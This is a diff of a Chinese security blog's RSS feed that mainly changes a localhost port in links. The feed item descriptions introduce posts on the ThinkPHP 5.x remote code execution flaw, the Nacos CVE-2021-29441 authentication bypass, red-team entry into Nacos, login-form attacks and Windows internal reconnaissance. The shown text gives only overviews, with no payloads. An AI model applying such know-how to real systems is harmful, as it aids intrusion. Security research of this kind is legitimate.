+        <guid>http://localhost:57441/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05.0.22-5.1.29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid>
+        <description>&lt;img src="http://localhost:57441/images/30.webp" alt="Featured image of post 【Thinkphp漏洞复现】5.0.22-5.1.29远程代码执行漏洞" /&gt;&lt;h1 id=&#34;0x00-简介&#34;&gt;0x00 简介&lt;/h1&gt;
 &lt;p&gt;ThinkPHP(FCS)是一个轻量级的中型框架， 是从Java的Struts结构移植过来的中文PHP开发框架。 它使用面向对象的开发结构和MVC模式， 并且模拟实现了Struts的标签库， 各方面都比较人性化，熟悉J2EE的开发人员相对比较容易上手，适合php框架初学者。ThinkPHP的宗旨是简化开发、 提高效率、 易于扩展， 其在对数据库的支持方面已经包括MySQL、 MSSQL、Sqlite、 PgSQL、Oracle， 以及PDO的支持。 ThinkPHP有着丰富的文档和示例， 框架的兼容性较强， 但是其功能有限，因此更适合用于中小项目的开发。&lt;/p&gt;
 &lt;h1 id=&#34;0x01-漏洞概述&#34;&gt;0x01 漏洞概述&lt;/h1&gt;
 &lt;p&gt;ThinkPHP 5.0.x版本和5.1.x版本中存在远程代码执行漏洞， 该漏洞源于ThinkPHP在获取控制器名时未对用户提交的参数进行严格的过滤。 远程攻击者可通过输入‘＼ ’字符的方式调用任意方法利用该漏洞执行代码。&lt;/p&gt;
@@ -310,11 +703,11 @@ thinkphp 5.1.x&lt;/p&gt;
         </item>
         <item>
         <title>【Nacos】CVE-2021-29441 Nacos 权限认证绕过漏洞</title>
-        <link>http://localhost:1313/p/nacoscve-2021-29441-nacos-%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</link>
+        <link>http://localhost:57441/p/nacoscve-2021-29441-nacos-%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</link>
         <pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/p/nacoscve-2021-29441-nacos-%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</guid>
-        <description>&lt;img src="http://localhost:1313/images/15.webp" alt="Featured image of post 【Nacos】CVE-2021-29441 Nacos 权限认证绕过漏洞" /&gt;&lt;h1 id=&#34;1-漏洞概述&#34;&gt;1. 漏洞概述&lt;/h1&gt;
+        <guid>http://localhost:57441/p/nacoscve-2021-29441-nacos-%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</guid>
+        <description>&lt;img src="http://localhost:57441/images/15.webp" alt="Featured image of post 【Nacos】CVE-2021-29441 Nacos 权限认证绕过漏洞" /&gt;&lt;h1 id=&#34;1-漏洞概述&#34;&gt;1. 漏洞概述&lt;/h1&gt;
 &lt;p&gt;2020年12月29日，Nacos官⽅在github发布的issue中披露Alibaba Nacos 存在⼀个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进⾏任意操作，包括&lt;strong&gt;创建新⽤户&lt;/strong&gt;并进⾏登录后操作。&lt;/p&gt;
 &lt;h1 id=&#34;2-影响版本&#34;&gt;2. 影响版本&lt;/h1&gt;
 &lt;p&gt;&lt;strong&gt;Nacos &amp;lt;= 2.0.0-ALPHA.1&lt;/strong&gt;&lt;/p&gt;
@@ -475,11 +868,11 @@ TrafficReviseFilter继承了Filter⽤来处理请求，⽽⾥⾯的doFilter的�
         </item>
         <item>
         <title>【Nacos】Nacos红队打点方法</title>
-        <link>http://localhost:1313/p/nacosnacos%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%96%B9%E6%B3%95/</link>
+        <link>http://localhost:57441/p/nacosnacos%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%96%B9%E6%B3%95/</link>
         <pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/p/nacosnacos%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%96%B9%E6%B3%95/</guid>
-        <description>&lt;img src="http://localhost:1313/images/10.webp" alt="Featured image of post 【Nacos】Nacos红队打点方法" /&gt;&lt;h1 id=&#34;0x00-前置知识&#34;&gt;0x00 前置知识&lt;/h1&gt;
+        <guid>http://localhost:57441/p/nacosnacos%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%96%B9%E6%B3%95/</guid>
+        <description>&lt;img src="http://localhost:57441/images/10.webp" alt="Featured image of post 【Nacos】Nacos红队打点方法" /&gt;&lt;h1 id=&#34;0x00-前置知识&#34;&gt;0x00 前置知识&lt;/h1&gt;
 &lt;h2 id=&#34;1-平台语法&#34;&gt;1. 平台语法&lt;/h2&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -574,11 +967,11 @@ NacosExploit&lt;/p&gt;
         </item>
         <item>
         <title>【Web攻防】常见Web攻防登录框打法-01</title>
-        <link>http://localhost:1313/p/web%E6%94%BB%E9%98%B2%E5%B8%B8%E8%A7%81web%E6%94%BB%E9%98%B2%E7%99%BB%E5%BD%95%E6%A1%86%E6%89%93%E6%B3%95-01/</link>
+        <link>http://localhost:57441/p/web%E6%94%BB%E9%98%B2%E5%B8%B8%E8%A7%81web%E6%94%BB%E9%98%B2%E7%99%BB%E5%BD%95%E6%A1%86%E6%89%93%E6%B3%95-01/</link>
         <pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/p/web%E6%94%BB%E9%98%B2%E5%B8%B8%E8%A7%81web%E6%94%BB%E9%98%B2%E7%99%BB%E5%BD%95%E6%A1%86%E6%89%93%E6%B3%95-01/</guid>
-        <description>&lt;img src="http://localhost:1313/images/12.webp" alt="Featured image of post 【Web攻防】常见Web攻防登录框打法-01" /&gt;&lt;h1 id=&#34;开局&#34;&gt;开局&lt;/h1&gt;
+        <guid>http://localhost:57441/p/web%E6%94%BB%E9%98%B2%E5%B8%B8%E8%A7%81web%E6%94%BB%E9%98%B2%E7%99%BB%E5%BD%95%E6%A1%86%E6%89%93%E6%B3%95-01/</guid>
+        <description>&lt;img src="http://localhost:57441/images/12.webp" alt="Featured image of post 【Web攻防】常见Web攻防登录框打法-01" /&gt;&lt;h1 id=&#34;开局&#34;&gt;开局&lt;/h1&gt;
 &lt;p&gt;首先先拿到一个站点：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -678,11 +1071,11 @@ NacosExploit&lt;/p&gt;
         </item>
         <item>
         <title>【内网攻防】Windows工作组信息收集</title>
-        <link>http://localhost:1313/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2windows%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link>
+        <link>http://localhost:57441/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2windows%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link>
         <pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2windows%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</guid>
-        <description>&lt;img src="http://localhost:1313/images/13.webp" alt="Featured image of post 【内网攻防】Windows工作组信息收集" /&gt;&lt;h1 id=&#34;0x00-前置&#34;&gt;0x00 前置&lt;/h1&gt;
+        <guid>http://localhost:57441/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2windows%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</guid>
+        <description>&lt;img src="http://localhost:57441/images/13.webp" alt="Featured image of post 【内网攻防】Windows工作组信息收集" /&gt;&lt;h1 id=&#34;0x00-前置&#34;&gt;0x00 前置&lt;/h1&gt;
 &lt;p&gt;当红队渗透测试人员突破边界进入内网战场，面对复杂网络环境时，首要任务是构建四维立体情报模型，通过体系研判完成内网基础信息收集。这套基于实战场景的专业分析框架，可精准回答渗透过程中四个核心定位问题：&lt;br&gt;
 我是谁？&amp;ndash;主机身份与特权边界确认。&lt;br&gt;
 这是哪？&amp;ndash;对目前机器处网络环境的拓扑结构进行分析和判断。&lt;br&gt;
